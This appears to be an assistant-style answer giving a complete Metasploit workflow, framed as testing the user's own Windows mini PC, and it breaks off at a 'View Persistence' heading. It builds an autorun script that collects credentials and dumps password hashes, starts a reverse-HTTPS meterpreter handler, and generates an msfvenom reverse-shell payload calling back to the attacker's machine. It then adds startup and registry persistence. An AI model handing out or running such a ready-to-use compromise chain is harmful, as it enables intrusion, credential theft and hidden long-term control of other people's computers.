Here's a clean, complete workflow from start to finish.

### 1. Create the AutoRunScript (Normal Terminal)

```bash
cat > /root/autorun.rc << 'EOF'
sysinfo
getuid
getprivs
ipconfig

run post/windows/gather/checkvm
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
run post/multi/recon/local_exploit_suggester

run post/windows/gather/credentials/credential_collector
run post/windows/gather/smart_hashdump

print_status "=== AutoRunScript Completed ==="
EOF
```

### 2. Start the Handler in msfconsole

```msf
# Clean start
jobs -K

use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 0.0.0.0
set LPORT 3777
set ExitOnSession false
set AutoRunScript multi_console_command -rc /root/autorun.rc
exploit -j

jobs
```

### 3. Generate Test Payload (Normal Terminal)

```bash
# First find your Kali IP
ip addr show | grep "inet " | grep -v 127.0.0.1

# Generate payload (replace YOUR_KALI_IP)
msfvenom -p windows/x64/meterpreter_reverse_https \
  LHOST=YOUR_KALI_IP \
  LPORT=3777 \
  -f exe -o ~/test_payload.exe
```

### 4. Transfer & Execute on Target (Your Mini PC)

- Copy `~/test_payload.exe` to the Windows mini PC (USB, shared folder, etc.).
- Run it as Administrator on the target.

When it connects, you should see a new session and the autorun commands execute automatically.

### 5. Basic Session Management

```msf
sessions -l          # List sessions
sessions -i 1        # Interact with session 1
background           # Go back to msf prompt (Ctrl+Z also works)
```

### 6. Persistence (Two Reliable Methods)

**Method A: Persistent Service (Recommended)**

Inside the Meterpreter session:

```meterpreter
run post/windows/manage/persistence_exe -U -i 30 -p 3777 -r YOUR_KALI_IP
```

- `-U` = User startup
- `-i 30` = Check every 30 seconds
- `-p 3777` = Your port
- `-r` = Your Kali IP

**Method B: Registry Persistence**

```meterpreter
run persistence -U -i 10 -p 3777 -r YOUR_KALI_IP
```

**View Persistence**

```meterpreter
